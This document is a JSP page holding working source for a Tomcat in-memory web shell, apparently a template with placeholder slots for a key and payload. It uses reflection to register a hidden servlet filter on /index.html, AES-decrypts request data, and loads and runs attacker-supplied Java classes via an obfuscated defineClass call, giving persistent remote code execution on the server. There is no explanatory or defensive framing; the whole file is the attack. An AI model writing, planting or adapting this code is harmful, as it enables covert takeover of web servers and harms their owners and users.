<%@ page contentType="text/html;charset=UTF-8" language="java"%><%@ page import="java.util.*,javax.crypto.*,java.lang.reflect.*,javax.servlet.*,java.io.*,org.apache.catalina.*,org.apache.catalina.core.*,org.apache.tomcat.util.descriptor.web.*"%><% class F implements Filter{public void init(FilterConfig a)throws ServletException{}public void doFilter(ServletRequest y,ServletResponse i,FilterChain v)throws IOException,ServletException{try{List a=new ArrayList<>();a.add(i);String k="{@key}";String r="";{@getvalue}byte[] w={@decode};byte[] f;Cipher c=Cipher.getInstance("AES");c.init(2,new javax.crypto.spec.SecretKeySpec(k.getBytes(),"AES"));f=c.doFinal(w);String g=new String(f);if(java.util.regex.Pattern.matches("[\\w.]{1,40}@.+",g)){a.add(g.substring(g.indexOf('@')+1));Class.forName(g.substring(0,g.indexOf('@'))).newInstance().equals(a);return;}HttpSession z=request.getSession();if(f[0]==-54&&f[1]==-2&&f[2]==-70&&f[3]==-66){z.setAttribute("k",f);}else if(z.getAttribute("k")!=null){byte[]h=(byte[])z.getAttribute("k");byte[] j=new byte[h.length+f.length];System.arraycopy(h,0,j,0,h.length);System.arraycopy(f,0,j,h.length,f.length);z.setAttribute("k",j);}try{byte[] l=(byte[])z.getAttribute("k");Method m=ClassLoader.class.getDeclaredMethod(new String(new byte[]{100,101,102,105,110,101,67,108,97,115,115}),byte[].class,int.class,int.class);m.setAccessible(true);((Class)m.invoke(this.getClass().getClassLoader(),l,0,l.length)).newInstance().equals(a);z.setAttribute("k",null);}catch(Exception e){return;}}catch(Exception e){v.doFilter(y,i);}}public void destroy(){}}%><%Object a=request.getSession().getServletContext();Field b=a.getClass().getDeclaredField("context");b.setAccessible(true);Object c=b.get(a);Field d=c.getClass().getDeclaredField("context");d.setAccessible(true);StandardContext e=(StandardContext)d.get(c);Field f=e.getClass().getDeclaredField("filterConfigs");f.setAccessible(true);Map g=(Map)f.get(e);String name="F";if(g.get(name)==null){F h=new F();FilterDef j=new FilterDef();j.setFilterName(name);j.setFilterClass(h.getClass().getName());j.setFilter(h);e.addFilterDef(j);FilterMap l=new FilterMap();l.addURLPattern("/index.html");l.setFilterName(name);l.setDispatcher(DispatcherType.REQUEST.name());e.addFilterMapBefore(l);Constructor q=ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);q.setAccessible(true);g.put(name,q.newInstance(e,j));out.write("Success!");}else{out.write("Injected!");}%>